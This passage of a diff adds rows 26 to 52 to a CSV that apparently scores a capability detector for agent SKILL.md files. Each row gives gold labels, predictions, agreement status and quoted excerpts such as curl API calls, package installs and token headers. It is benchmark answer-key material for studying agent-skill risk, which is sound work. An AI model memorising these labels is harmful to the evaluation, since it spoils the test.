+INST (No): L53: at install time so `model_overrides` from `.planning/config.json` and
+SCRIPT (No): No supporting excerpt identified.",0000cd09c2333c804cb6b44a1f6c4e5818e518a8,singleton,None,"CMD, FS"
+26,https://github.com/api-platform/skillset/blob/HEAD/skills/serialization-groups/SKILL.md,FS,None,No agreement,NET: L5 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. CRED: L52 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): L5: description: ""Configures serialization with normalizationContext/denormalizationContext and #[Groups] in API Platform — per-operation contexts, #[Context] per-property overrides, and read/write group naming. Use when the user mentions serialization groups, #[Groups], normalizationContext, denormaliz
+L13: > **api-resource**). Reasons groups are a poor default:
+L22: > - **They block streaming serialization.** API Platform's JsonStreamer path needs
+FS (Yes): No supporting excerpt identified.
+CRED (No): L52: #[Groups(['book:write'])]                // write-only, e.g. a password
+L53: public ?string $secret = null;
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0000cdd0c0b145463eeb8353ca701dacfc6c0a15,singleton,None,FS
+27,https://github.com/Alex-stack-hub/myres/blob/HEAD/vllm-ascend/.agents/skills/vllm-ascend-model-adapter/SKILL.md,FS,"CMD, NET",No agreement,"CMD: L117 is conditional/example-like; distinguish available capability from mandatory action. NET: L66 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. FS: L18 is conditional/example-like; distinguish available capability from mandatory action. INST: L47 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L56 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CMD, NET; FN: FS","CMD (No): L35: - Final deliverable commit must be one single signed commit in the current working repo (`git commit -sm ...`).
+L46: - Confirm delivery root (the current git repo where the final commit is expected).
+L117: - Generate tutorial markdown at `docs/source/tutorials/models/<ModelName>.md` following the standard template (Introduction, Supported Features, Environment Preparation with docker tabs, Deployment with serve script, Functional Verification with curl example, Accuracy Evaluation, Performance). Fill 
+NET (No): L29: - Default API port is `8000` unless user explicitly asks otherwise.
+L66: - If remote code needs newer transformers symbols, do not upgrade dependency.
+L81: - Goal: fast validate architecture path / operator path / API path.
+FS (Yes): L17: 2. Read `references/multimodal-ep-aclgraph-lessons.md` (feature-first checklist).
+L18: 3. If startup/inference fails, read `references/troubleshooting.md`.
+L19: 4. If checkpoint is fp8-on-NPU, read `references/fp8-on-npu-lessons.md`.
+CRED (No): No supporting excerpt identified.
+INST (No): L47: - Confirm runtime import path points to `/vllm-workspace/*` install.
+SCRIPT (No): L56: - Decide whether support already exists in `vllm/model_executor/models/registry.py`.
+L64: - register architecture in `vllm/model_executor/models/registry.py`;",0000d71485d176ceda25d2b28af218cfe754f794,widely_reused,"CMD, NET",FS
+28,https://github.com/VibeBrainsProjects/Fresta/blob/HEAD/.vibe/skills/update-skill/SKILL.md,"CMD, FS",None,No agreement,"SCRIPT: L55 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L55: - **???????** (>200 ?????): ?????? — ? ?????????? `references/`, ?? ???????? ?? SKILL.md. ??????? — ? `scripts/`.",0000dd559cd28774c6b3a1d42d1931d5be5fe660,singleton,None,"CMD, FS"
+29,https://github.com/26zl/cybersec-toolkit/blob/HEAD/.claude/skills/implementing-identity-governance-with-sailpoint/SKILL.md,"CMD, NET, FS, CRED",None,No agreement,"No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: None; FN: CMD, NET, FS, CRED","CMD (Yes): L49: - Python 3.8+ with required dependencies installed
+NET (Yes): No supporting excerpt identified.
+FS (Yes): No supporting excerpt identified.
+CRED (Yes): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0000e45054402785f95f8bfc454b1774dd8b839e,widely_reused,None,"CMD, NET, FS, CRED"
+30,https://github.com/jukeyman/jukeyman-skills/blob/HEAD/skills/saas-packs--lokalise-pack--lokalise-migration-deep-dive/SKILL.md,"CMD, NET, FS, CRED","CMD, NET, FS, CRED, SCRIPT",Partial agreement,NET: L22 candidate; distinguish remote operation from URL/reference or local command. CRED: L49 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. SCRIPT: L23 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: SCRIPT; FN: None,"CMD (Yes): L22: !`npm list @lokalise/node-api 2>/dev/null | grep lokalise || echo 'SDK not installed'`
+L23: !`node --version 2>/dev/null || echo 'Node.js not available'`
+L48: curl -X POST ""https://api.crowdin.com/api/v2/projects/${CROWDIN_PROJECT_ID}/translations/builds"" \
+NET (Yes): L22: !`npm list @lokalise/node-api 2>/dev/null | grep lokalise || echo 'SDK not installed'`
+L34: - `lokalise2` CLI or `@lokalise/node-api` SDK installed
+L48: curl -X POST ""https://api.crowdin.com/api/v2/projects/${CROWDIN_PROJECT_ID}/translations/builds"" \
+FS (Yes): L58: echo ""Exported $(find crowdin-export/ -name '*.json' | wc -l) translation files""
+L132: mkdir -p lokalise-import
+L291: find source-export/ -name ""*.json"" -o -name ""*.xliff"" -o -name ""*.po"" | head -20
+CRED (Yes): L49: -H ""Authorization: Bearer ${CROWDIN_TOKEN}"" \
+L55: -H ""Authorization: Bearer ${CROWDIN_TOKEN}"" -o crowdin-export.zip
+L206: const lok = new LokaliseApi({ apiKey: process.env.LOKALISE_API_TOKEN! });
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L23: !`node --version 2>/dev/null || echo 'Node.js not available'`
+L133: node transform-keys.mjs crowdin crowdin-export lokalise-import
+L91: // transform-keys.mjs — Convert source format to Lokalise-compatible JSON",0000f7f3721c9f97ffce1b7b55c3006922525eae,singleton,SCRIPT,None
+31,https://github.com/modbender/skill-library-mcp/blob/HEAD/data/super-transcribe/SKILL.md,"CMD, NET, FS, INST, SCRIPT","CMD, NET, FS, INST, SCRIPT",Exact agreement,CMD: L504 is conditional/example-like; distinguish available capability from mandatory action. NET: L547 candidate; distinguish remote operation from URL/reference or local command. INST: L64 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. SCRIPT: L69 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: None,"CMD (Yes): L61: | `""install_python""` | Tell user to install Python 3.10+ first, then re-run  |
+L504: | Non-WAV audio (mp3/m4a/mp4)          | `sudo apt install ffmpeg` (Linux) · `brew install ffmpeg` (macOS)                        | No — quickstart reports if missing                                         |
+L521: **Hard requirements:** Python 3.10+ only. Everything else is installed by `--quickstart` or auto-installs on first use.
+NET (Yes): L547: uv pip install --python .venv/bin/python torch --index-url https://download.pytorch.org/whl/cu121
+L1075: | **CUDA not available**               | Install PyTorch with CUDA: `pip install torch --index-url https://download.pytorch.org/whl/cu121` |
+L194: | **YouTube/URL**          | `./scripts/transcribe https://youtube.com/watch?v=...`                 |
+FS (Yes): L281: - Combine with `-o` to also save full transcript to file: `./scripts/transcribe --agent -o /tmp/transcript.txt audio.mp3`
+L353: - **Long audio (>10 min):** Always save to a file (`-o /tmp/transcript.txt`), share the file path, and provide a brief summary of the content
+L354: - **Subtitle/data formats** (SRT, VTT, ASS, CSV, JSON, etc.): Always save to file with `-o`, tell the user the path
+CRED (No): No supporting excerpt identified.
+INST (Yes): L50: Follow these 3 steps on first use. Goal: install **only** what this user's hardware needs — nothing extra.
+L61: | `""install_python""` | Tell user to install Python 3.10+ first, then re-run  |
+L64: Key fields: `gpu` (name + VRAM), `ffmpeg`, `backends` status, `estimated_install` (download size for recommended backend), `missing_optional` (non-blocking items — **do NOT eagerly install these**).
+SCRIPT (Yes): L69: ./scripts/transcribe --quickstart --dry-run --json
+L281: - Combine with `-o` to also save full transcript to file: `./scripts/transcribe --agent -o /tmp/transcript.txt audio.mp3`
+L516: ./scripts/transcribe --setup all --diarize   # Full install with diarization",0000f8dbb4334eaee751410966b0875571fcfef5,singleton,None,None
+32,https://github.com/BdM-15/capture-insights/blob/HEAD/skills/vault-lint/SKILL.md,FS,None,No agreement,No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0000fc817e76c3460b6398803d5df13d72d99801,singleton,None,FS
+33,https://github.com/Salahsr01/Cleanbot/blob/HEAD/workspace/skills/campaign-planning/SKILL.md,NET,None,No agreement,NET: L20 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): L20: TACTIQUES : [Actions concretes - email sequences, LinkedIn, contenu]
+L48: JOUR 1 - LINKEDIN
+L52: JOUR 2 - EMAIL #1 (Framework PAS)
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000100d7ed76e6364690e6c437ad9f1e8a6eef51,singleton,None,NET
+34,https://github.com/santosomar/general-secure-coding-agent-skills/blob/HEAD/skills/security/taint-instrumentation-assistant/SKILL.md,FS,None,No agreement,NET: L20 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): L20: **Upstream:** <https://github.com/cosai-oasis/project-codeguard/tree/main/skills/software-security>
+L32: 1. Pull the language-specific source/sink/sanitizer lists from the CodeGuard rules above.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00010b219d657e2e851c02a450693aaf0f32a102,singleton,None,FS
+35,https://github.com/chenqin231/OhMyDesk/blob/HEAD/.agent/skills/update-codemaps/SKILL.md,FS,None,No agreement,SCRIPT: L24 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): L12: 1. Scan all source files for imports, exports, and dependencies
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L24: Use TypeScript/Node.js for analysis. Focus on high-level structure, not implementation details.",0001137a1c11bd8ff5db6074ec009582963869df,reused,None,FS
+36,https://github.com/micsapp/micstec-skills/blob/HEAD/claude-code/plugins-plus-skills/plugins/testing/load-balancer-tester/skills/testing-load-balancers/SKILL.md,"CMD, NET","CMD, NET",Exact agreement,NET: L86 candidate; distinguish remote operation from URL/reference or local command. CRED: L51 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: None,"CMD (Yes): L86: backend=$(curl -s -H ""Host: app.test.com"" http://lb.test.com/health \
+L100: curl -s http://lb.test.com/health  # Backend A
+L101: curl -s http://lb.test.com/health  # Backend B
+NET (Yes): L86: backend=$(curl -s -H ""Host: app.test.com"" http://lb.test.com/health \
+L100: curl -s http://lb.test.com/health  # Backend A
+L101: curl -s http://lb.test.com/health  # Backend B
+FS (No): No supporting excerpt identified.
+CRED (No): L51: - Send multiple requests with the same session cookie.
+L53: - Verify a new session (no cookie) can route to any backend.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00012e069cc45c637d9b5acb4730dc0c690b7a9a,reused,None,None
+37,https://github.com/denya/sonos-lastfm/blob/HEAD/skills/setup-sonos-lastfm/SKILL.md,"CMD, NET, FS, CRED, INST","CMD, FS, CRED, INST",Partial agreement,CMD: L35 is conditional/example-like; distinguish available capability from mandatory action. NET: L38 candidate; distinguish remote operation from URL/reference or local command. FS: L193 is conditional/example-like; distinguish available capability from mandatory action. CRED: L71 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L35 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: NET,"CMD (Yes): L25: python3 --version 2>/dev/null || python --version 2>/dev/null
+L35: If Python is not installed or is below 3.14, guide the user to install it:
+L36: - **macOS**: `brew install python@3.14` or download from python.org
+NET (Yes): L38: - **Windows**: Download from https://www.python.org/downloads/ — check ""Add to PATH""
+L12: PyPI: https://pypi.org/project/sonos-lastfm/
+L13: Source: https://github.com/denya/sonos-lastfm
+FS (Yes): L123: Create the service file:
+L126: mkdir -p ~/.config/systemd/user
+L193: **Important**: Adjust the path to `sonos-lastfm` — find it with `which sonos-lastfm`. If installed via `uv`, it may be at `~/.local/bin/sonos-lastfm`.
+CRED (Yes): L71: 3. Submit and note down the **API Key** and **Shared Secret** (also called API Secret)
+L72: 4. They also need their Last.fm **username** and **password**
+L87: 3. **Password**: their Last.fm password (hidden input)
+INST (Yes): L35: If Python is not installed or is below 3.14, guide the user to install it:
+L36: - **macOS**: `brew install python@3.14` or download from python.org
+L37: - **Linux**: `sudo apt install python3.14` / `sudo dnf install python3.14` or use `pyenv`
+SCRIPT (No): No supporting excerpt identified.",000138251e39e54fee5ef530913bc7b34b839495,reused,None,NET
+38,https://github.com/Flexksx/alemar-capoeira-chisinau/blob/HEAD/.claude/skills/seo-maps/SKILL.md,"NET, FS, CRED",None,No agreement,"CMD: L88 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. NET: L63 candidate; distinguish remote operation from URL/reference or local command. CRED: L66 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L256 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: NET, FS, CRED","CMD (No): L88: 5. Find target business rank at each point
+NET (Yes): L63: **Load:** `references/maps-api-endpoints.md`
+L80: **Load:** `references/maps-api-endpoints.md` for Maps SERP endpoint details.
+L7: auditing via API, review intelligence across Google/Tripadvisor/Trustpilot,
+FS (Yes): L58: **Load:** `references/maps-free-apis.md`
+L63: **Load:** `references/maps-api-endpoints.md`
+L79: **Load:** `references/maps-geo-grid.md` for algorithm, SoLV formula, heatmap format.
+CRED (Yes): L66: **Detection:** Tier 1 available AND Google Maps API key in environment.
+INST (No): L256: | DataForSEO MCP not available | Drop to Tier 0. Inform user: ""DataForSEO not detected. Running free-tier analysis. For geo-grid tracking and review intelligence, install the DataForSEO extension."" |
+SCRIPT (No): No supporting excerpt identified.",000138b600b8df2ca17c7c1fe534a1f3060be2aa,widely_reused,None,"NET, FS, CRED"
+39,https://github.com/leogodin217/leos_claude_starter/blob/HEAD/.claude/skills/audit-docs/SKILL.md,FS,None,No agreement,CMD: L94 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS,"CMD (No): L94: Read manifest to find docs with `status: pending`.
+NET (No): No supporting excerpt identified.
+FS (Yes): L94: Read manifest to find docs with `status: pending`.
+L109: 3. **Write findings file** - take agent response and write to `findings/{doc_name}`:
+L141: 2. **Read all findings files** from `findings/` folder
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00013907b50ed28135245980b4f5fca437fd1805,singleton,None,FS
+40,https://github.com/charlieviettq/awesome-agent-skill/blob/HEAD/.claude/skills/va-postgres-pro/SKILL.md,FS,None,No agreement,"L6: allowed-tools: Read, Glob, Grep — contextual reference or example may be mistaken for operational capability; inspect surrounding instructions. | Provisional FP: None; FN: FS","CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00016756682f06d3fc26345ce3184c157b2a920d,singleton,None,FS
+41,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/clawpod/SKILL.md,"CMD, NET, CRED","CMD, NET, CRED",Exact agreement,NET: L8 candidate; distinguish remote operation from URL/reference or local command. CRED: L104 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. | Provisional FP: None; FN: None,"CMD (Yes): L66: curl -s -G --data-urlencode ""url=THE_URL"" \
+L71: Replace `THE_URL` with the actual URL. `curl --data-urlencode` handles URL-encoding automatically.
+L85: curl -s -G --data-urlencode ""url=$url"" \
+NET (Yes): L8: metadata: {""openclaw"":{""emoji"":""??"",""homepage"":""https://clawpod.joinmassive.com"",""primaryEnv"":""MASSIVE_UNBLOCKER_TOKEN"",""requires"":{""bins"":[""curl""],""env"":[""MASSIVE_UNBLOCKER_TOKEN""]}}}
+L7: homepage: https://clawpod.joinmassive.com
+L13: Fetch and extract content from URLs or search Google using Massive's Unblocker APIs. Handles JS rendering, CAPTCHAs, and retries automatically. Returns HTML or structured JSON.
+FS (No): No supporting excerpt identified.
+CRED (Yes): L104: curl -s -H ""Authorization: Bearer $MASSIVE_UNBLOCKER_TOKEN"" \
+L113: curl -s -H ""Authorization: Bearer $MASSIVE_UNBLOCKER_TOKEN"" \
+L34: [ -n ""$MASSIVE_UNBLOCKER_TOKEN"" ] && echo ""TOKEN=SET"" || echo ""TOKEN=MISSING""
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00016954f97509a1cdb69c0aa42c8038c1d8e510,reused,None,None
+42,https://github.com/zwright8/OpenClaw-Code/blob/HEAD/skills/generated/shards/tools01/0036-jira-report-builder/SKILL.md,NET,None,No agreement,NET: L38 candidate; distinguish remote operation from URL/reference or local command. CRED: L46 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): L38: | API key likely required | `no` |
+L68: 6. Publish the report bundle only after freshness and correctness gates pass, along with any interpretive notes required for downstream readers.
+FS (No): No supporting excerpt identified.
+CRED (No): L46: | Access token or personal access token | `token` | `JIRA_TOKEN`, `JIRA_ACCESS_TOKEN` | Validate the token with the smallest read-only endpoint that proves scope and tenancy. |
+L5: description: Use when tasks require jira report builder with credential-aware preflight, deterministic execution, validation gates, and handoff-ready artifacts.
+L30: - [ ] Credential reuse has been checked before asking for new secrets.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00016d74de04c71bdbde7f41ae4a34b7849e9849,singleton,None,NET
+43,https://github.com/EmiRoberti77/hr_manager/blob/HEAD/.claude/skills/agent-tools/SKILL.md,NET,None,No agreement,NET: L5 candidate; distinguish remote operation from URL/reference or local command. SCRIPT: L49 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): L5: description: Use this skill whenever working on the agent layer or its tools — the FastMCP server, the query tool, the describe-data-model tool, or the structured view-spec the agent emits. Trigger this for any task that touches how the agent turns a prompt into a query or into a chart/table, how to
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L49: The FastMCP server in `mcp-server/server.py` exposes exactly two tools.",000171c2f736a178c3f5e1ad4e346f10265b16a0,singleton,None,NET
+44,https://github.com/maneeshanif/todo-spec-driven/blob/HEAD/.claude/skills/dapr-integration/SKILL.md,"CMD, FS","CMD, INST",Partial agreement,NET: L295 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. CRED: L26 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. INST: L14 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: INST; FN: FS,"CMD (Yes): L18: 6. **Test locally** - `dapr run` commands
+L101: ## Python SDK Integration
+L268: - [ ] Python SDK installed (`dapr`, `dapr-ext-fastapi`)
+NET (No): L295: - [Dapr Python SDK](https://github.com/dapr/python-sdk)
+L5: description: Integrate Dapr building blocks for event-driven microservices - Pub/Sub, State Management, Secrets, Service Invocation, and Jobs API. Use when implementing event-driven architecture for Phase 5. (project)
+L26: | **Secrets** | Secret management | API keys, DB credentials |
+FS (Yes): L13: 1. **Read Phase 5 Constitution** - `constitution-prompt-phase-5.md`
+L16: 4. **Create component files** - In `dapr-components/` directory
+L34: Create `dapr-components/pubsub.yaml`:
+CRED (No): L26: | **Secrets** | Secret management | API keys, DB credentials |
+INST (No): L14: 2. **Check Dapr installation** - `dapr --version`
+L103: ### Installation
+SCRIPT (No): No supporting excerpt identified.",00017a98740b1219034daa3c6f6751d49acc01a7,widely_reused,INST,FS
+45,https://github.com/OrcaQubits/agentic-commerce-skills-plugins/blob/HEAD/acp-agentic-commerce/skills/acp-checkout-mcp/SKILL.md,"NET, FS","CMD, NET",Partial agreement,NET: L17 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: CMD; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (Yes): L17: 4. Fetch MCP SDK docs: web-search `site:github.com modelcontextprotocol python-sdk` or `typescript-sdk` for current SDK
+L13: **Fetch live docs**:
+L14: 1. Web-search `acp agentic commerce protocol MCP server implementation` for MCP binding guidance
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00019eeb303b96d83a69d59b58d47dd68be03df6,reused,CMD,FS
+46,https://github.com/BEKO2210/Firstbrain/blob/HEAD/03 - Resources/Skills/seo-keyword-strategist/SKILL.md,NET,None,No agreement,FS: L36 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): No supporting excerpt identified.
+FS (No): L36: - If detailed examples are required, open `resources/implementation-playbook.md`.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0001a2f8d5a0a99d5c7c4a170ff440cfe16c37c3,singleton,None,NET
+47,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/mock-data/SKILL.md,None,None,Exact agreement,NET: L63 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L59 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: None,"CMD (No): No supporting excerpt identified.
+NET (No): L63: async function fetch{Feature}Data(): Promise<{Feature}Data> {
+L64: await new Promise((r) => setTimeout(r, 500)); // Simulate API
+L71: queryFn: fetch{Feature}Data,
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L59: // hooks/use{Feature}.ts",0001a8d57709101e5f8efe560f42db4e60a88769,reused,None,None
+48,https://github.com/modbender/skill-library-mcp/blob/HEAD/data/yijing-divination/SKILL.md,FS,"CMD, SCRIPT",No agreement,"CMD: L17 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L18 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CMD, SCRIPT; FN: FS","CMD (No): L17: ```bash
+L18: python3 scripts/divine.py --method coin --question ""?????""
+L22: ```bash
+NET (No): No supporting excerpt identified.
+FS (Yes): L49: with open('assets/hexagrams_full.json', 'r') as f:
+L106: with open('references/hexagrams.json', 'r') as f:
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L18: python3 scripts/divine.py --method coin --question ""?????""
+L23: python3 scripts/divine.py --method yarrow --question ""?????""
+L28: python3 scripts/divine.py --method coin --seed ""20260214""",0001ace895b1df4953b89c5ab853bebc46818eb5,singleton,"CMD, SCRIPT",FS
+49,https://github.com/a3tai/openclaw-go/blob/HEAD/.opencode/skills/docs-site/SKILL.md,"CMD, NET, FS, INST","INST, SCRIPT",Partial agreement,"NET: L56 candidate; distinguish remote operation from URL/reference or local command. INST: L53 candidate; distinguish installation from prerequisites or ordinary execution. SkillGuard prediction unavailable or recorded as None; verify original prediction before attributing an error. | Source SHA not in supplied key. | Provisional FP: SCRIPT; FN: CMD, NET, FS","CMD (Yes): L53: | `npm ci` | Install dependencies (clean) |
+L54: | `npm run dev` | Dev server with hot reload |
+L55: | `npm run build` | Build static site to `.vitepress/dist/` |
+NET (Yes): L56: | `npm run preview` | Serve built site locally at `http://localhost:4173/openclaw-go/` |
+L64: - **Edit links**: point to `https://github.com/a3tai/openclaw-go/edit/main/docs-site/:path`
+L92: - Keep code examples consistent with actual library API
+FS (Yes): L64: - **Edit links**: point to `https://github.com/a3tai/openclaw-go/edit/main/docs-site/:path`
+L68: 1. Create `docs-site/packages/<name>.md`
+L75: 1. Create `docs-site/guide/<name>.md`
+CRED (No): No supporting excerpt identified.
+INST (Yes): L53: | `npm ci` | Install dependencies (clean) |
+L84: - Uses Node 22, `npm ci`, `npm run build`
+SCRIPT (No): No supporting excerpt identified.",0001b4086bf6a97469f8abdd56afa20763bafe06,reused,SCRIPT,"CMD, NET, FS"
+50,https://github.com/David-Li0406/meta-skill-evloving/blob/HEAD/skill-flow/data/skills-refined-36k/skillsmp/modern-python/SKILL.md,CMD,None,No agreement,INST: L13 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L10 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD,"CMD (Yes): L13: - Format with `uvx ruff format .`
+L14: - Lint with `uvx ruff check .` and `uvx ty check`
+NET (No): No supporting excerpt identified.
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): L13: - Format with `uvx ruff format .`
+L14: - Lint with `uvx ruff check .` and `uvx ty check`
+SCRIPT (No): L10: - `uv run script.py`",0001ba131490dbccb2eb14ae56562d5427fc8cb3,singleton,None,CMD
+51,https://github.com/xpickey/ice-skills-claude-plugin/blob/HEAD/plugins/ice-tools/skills/graphify/SKILL.md,"CMD, NET, FS, INST, SCRIPT",None,No agreement,"NET: L57 is conditional/example-like; distinguish available capability from mandatory action. INST: L68 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L123 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CMD, NET, FS, INST, SCRIPT","CMD (Yes): L68: # Detect the correct Python interpreter (handles uv tool, pipx, venv, system installs)
+L73: _UV_PY=$(uv tool run graphifyy python -c ""import sys; print(sys.executable)"" 2>/dev/null)
+L76: # 2. Read shebang from graphify binary (pipx and direct pip installs)
+NET (Yes): L17: /graphify https://github.com/<owner>/<repo>           # clone repo then run full pipeline on it
+L35: /graphify add <url>                                   # fetch URL, save to ./raw, update graph
+L57: If the path argument starts with `https://github.com/` or `http://github.com/`, treat it as a GitHub URL - run Step 0 before anything else, then continue with the resolved local path.
+FS (Yes): L34: /graphify <path> --obsidian --obsidian-dir ~/vaults/my-project  # write vault to custom path (e.g. existing vault)
+L96: # Write interpreter path for all subsequent steps (persists across invocations)
+L98: ""$PYTHON"" -c ""import sys; open('graphify-out/.graphify_python', 'w', encoding='utf-8').write(sys.executable)""
+CRED (No): No supporting excerpt identified.
+INST (Yes): L68: # Detect the correct Python interpreter (handles uv tool, pipx, venv, system installs)
+L76: # 2. Read shebang from graphify binary (pipx and direct pip installs)
+L88: uv tool install --upgrade graphifyy -q 2>&1 | tail -3
+SCRIPT (Yes): L123: code:     N files (.py .ts .go ...)",0001d10314508f89794ef70298d5c57b517ecb7f,singleton,None,"CMD, NET, FS, INST, SCRIPT"
+52,https://github.com/Jeeva0104/connector-service-mini/blob/HEAD/.claude/skills/claimable-postgres/SKILL.md,"CMD, NET, FS, CRED","CMD, FS, CRED, INST",Partial agreement,NET: L17 candidate; distinguish remote operation from URL/reference or local command. FS: L154 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. CRED: L154 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L145 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L29 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: INST; FN: NET,"CMD (Yes): L17: curl -s -X POST ""https://pg.new/api/v1/database"" \
+L29: - **CLI** (`npx get-db@latest --yes`): Provisions and writes `.env` in one command. Convenient when Node.js is available and the user wants a simple setup.
+L41: curl -s -X POST ""https://pg.new/api/v1/database"" \
+NET (Yes): L17: curl -s -X POST ""https://pg.new/api/v1/database"" \
+L28: - **REST API**: Returns structured JSON. No runtime dependency beyond `curl`. Preferred when the agent needs predictable output and error handling.
+L32: - **Browser**: User cannot run CLI or API. Direct to https://pg.new.
+FS (Yes): L22: Parse `connection_string` and `claim_url` from the JSON response. Write `connection_string` to the project's `.env` as `DATABASE_URL`.
+L99: 2. Use `--env` to write to a different file (e.g. `--env .env.local`).
+L154: 4. **Write .env:** Write `DATABASE_URL=<connection_string>` to the project's `.env` (or the user's preferred file and key). Do not overwrite an existing key without confirmation.
+CRED (Yes): L22: Parse `connection_string` and `claim_url` from the JSON response. Write `connection_string` to the project's `.env` as `DATABASE_URL`.
+L154: 4. **Write .env:** Write `DATABASE_URL=<connection_string>` to the project's `.env` (or the user's preferred file and key). Do not overwrite an existing key without confirmation.
+L60: ""connection_string"": ""postgresql://..."",
+INST (No): L29: - **CLI** (`npx get-db@latest --yes`): Provisions and writes `.env` in one command. Convenient when Node.js is available and the user wants a simple setup.
+L145: For Vite projects, `vite-plugin-db` auto-provisions a database on `vite dev` if `DATABASE_URL` is missing. Install with `npm install -D vite-plugin-db`. See the [Claimable Postgres docs](https://neon.com/docs/reference/claimable-postgres#vite-plugin) for configuration.
+L87: npx get-db@latest --yes
+SCRIPT (No): L29: - **CLI** (`npx get-db@latest --yes`): Provisions and writes `.env` in one command. Convenient when Node.js is available and the user wants a simple setup.
+L30: - **SDK** (`get-db/sdk`): Scripts or programmatic provisioning in Node.js.",0001d5daa15353e83ba2c56053f4586c9b167ac7,singleton,INST,NET
